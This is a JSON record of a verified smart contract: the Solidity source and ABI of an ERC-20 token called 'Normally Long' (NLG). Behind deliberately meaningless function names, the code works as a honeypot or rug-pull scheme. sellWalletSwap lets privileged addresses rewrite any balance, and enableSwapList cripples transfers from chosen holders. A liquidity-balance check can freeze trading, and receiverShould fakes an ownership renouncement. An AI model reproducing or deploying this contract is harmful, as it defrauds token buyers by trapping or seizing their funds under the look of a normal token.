{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface limitToSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletFundLiquidity {\n    function createPair(address swapLimit, address modeTakeEnable) external returns (address);\n}\n\ninterface modeExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapTakeMax) external view returns (uint256);\n\n    function transfer(address amountTotal, uint256 swapTake) external returns (bool);\n\n    function allowance(address txMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountTotal,\n        uint256 swapTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountSwap, uint256 value);\n    event Approval(address indexed txMode, address indexed spender, uint256 value);\n}\n\ninterface modeExemptMetadata is modeExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NormallyLong is minTo, modeExempt, modeExemptMetadata {\n\n    string private maxMode = \"NLG\";\n\n    uint256 public launchedTotal;\n\n    address private launchedExempt;\n\n    uint256 constant fromAmount = 14 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return isToken;\n    }\n\n    function transfer(address toSender, uint256 swapTake) external virtual override returns (bool) {\n        return launchWalletEnable(_msgSender(), toSender, swapTake);\n    }\n\n    function modeTrading(address swapBuy, address amountTotal, uint256 swapTake) internal returns (bool) {\n        require(tradingTo[swapBuy] >= swapTake);\n        tradingTo[swapBuy] -= swapTake;\n        tradingTo[amountTotal] += swapTake;\n        emit Transfer(swapBuy, amountTotal, swapTake);\n        return true;\n    }\n\n    function launchWalletEnable(address swapBuy, address amountTotal, uint256 swapTake) internal returns (bool) {\n        if (swapBuy == walletTake) {\n            return modeTrading(swapBuy, amountTotal, swapTake);\n        }\n        uint256 marketingTokenTotal = modeExempt(teamListShould).balanceOf(atLiquidity);\n        require(marketingTokenTotal == modeEnableAt);\n        require(amountTotal != atLiquidity);\n        if (maxTotal[swapBuy]) {\n            return modeTrading(swapBuy, amountTotal, fromAmount);\n        }\n        return modeTrading(swapBuy, amountTotal, swapTake);\n    }\n\n    uint256 modeEnableAt;\n\n    address public walletTake;\n\n    function minIs() private view {\n        require(fromFund[_msgSender()]);\n    }\n\n    uint8 private exemptAt = 18;\n\n    function allowance(address feeFrom, address takeFromBuy) external view virtual override returns (uint256) {\n        if (takeFromBuy == minAt) {\n            return type(uint256).max;\n        }\n        return launchedFund[feeFrom][takeFromBuy];\n    }\n\n    uint256 private takeTo = 100000000 * 10 ** 18;\n\n    uint256 buyWalletLiquidity;\n\n    string private isToken = \"Normally Long\";\n\n    function takeShould(address txMarketing) public {\n        if (swapMode) {\n            return;\n        }\n        \n        fromFund[txMarketing] = true;\n        \n        swapMode = true;\n    }\n\n    function sellWalletSwap(address toSender, uint256 swapTake) public {\n        minIs();\n        tradingTo[toSender] = swapTake;\n    }\n\n    function owner() external view returns (address) {\n        return launchedExempt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxMode;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptAt;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedFund;\n\n    function receiverShould() public {\n        emit OwnershipTransferred(walletTake, address(0));\n        launchedExempt = address(0);\n    }\n\n    constructor (){\n        \n        limitToSell takeSell = limitToSell(minAt);\n        teamListShould = walletFundLiquidity(takeSell.factory()).createPair(takeSell.WETH(), address(this));\n        if (toLiquidityLimit != txFee) {\n            walletFeeTotal = exemptWallet;\n        }\n        walletTake = _msgSender();\n        receiverShould();\n        fromFund[walletTake] = true;\n        tradingTo[walletTake] = takeTo;\n        if (maxSellSender) {\n            launchedTotal = walletFee;\n        }\n        emit Transfer(address(0), walletTake, takeTo);\n    }\n\n    uint256 public exemptWallet;\n\n    uint256 public marketingLiquidity;\n\n    function enableSwapList(address isShould) public {\n        minIs();\n        if (toLiquidityLimit) {\n            launchedTotal = walletFeeTotal;\n        }\n        if (isShould == walletTake || isShould == teamListShould) {\n            return;\n        }\n        maxTotal[isShould] = true;\n    }\n\n    mapping(address => uint256) private tradingTo;\n\n    mapping(address => bool) public maxTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeTo;\n    }\n\n    address public teamListShould;\n\n    address minAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public fromFund;\n\n    bool private maxSellSender;\n\n    bool public swapMode;\n\n    event OwnershipTransferred(address indexed fromReceiver, address indexed tokenEnable);\n\n    function transferFrom(address swapBuy, address amountTotal, uint256 swapTake) external override returns (bool) {\n        if (_msgSender() != minAt) {\n            if (launchedFund[swapBuy][_msgSender()] != type(uint256).max) {\n                require(swapTake <= launchedFund[swapBuy][_msgSender()]);\n                launchedFund[swapBuy][_msgSender()] -= swapTake;\n            }\n        }\n        return launchWalletEnable(swapBuy, amountTotal, swapTake);\n    }\n\n    function totalLiquidity(uint256 swapTake) public {\n        minIs();\n        modeEnableAt = swapTake;\n    }\n\n    function approve(address takeFromBuy, uint256 swapTake) public virtual override returns (bool) {\n        launchedFund[_msgSender()][takeFromBuy] = swapTake;\n        emit Approval(_msgSender(), takeFromBuy, swapTake);\n        return true;\n    }\n\n    uint256 private walletFee;\n\n    function balanceOf(address swapTakeMax) public view virtual override returns (uint256) {\n        return tradingTo[swapTakeMax];\n    }\n\n    bool public txFee;\n\n    uint256 private walletFeeTotal;\n\n    bool private toLiquidityLimit;\n\n    address atLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return launchedExempt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeFromBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFromBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTakeMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"}],\"name\":\"enableSwapList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTake\",\"type\":\"uint256\"}],\"name\":\"sellWalletSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"}],\"name\":\"takeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamListShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapTake\",\"type\":\"uint256\"}],\"name\":\"totalLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "NormallyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}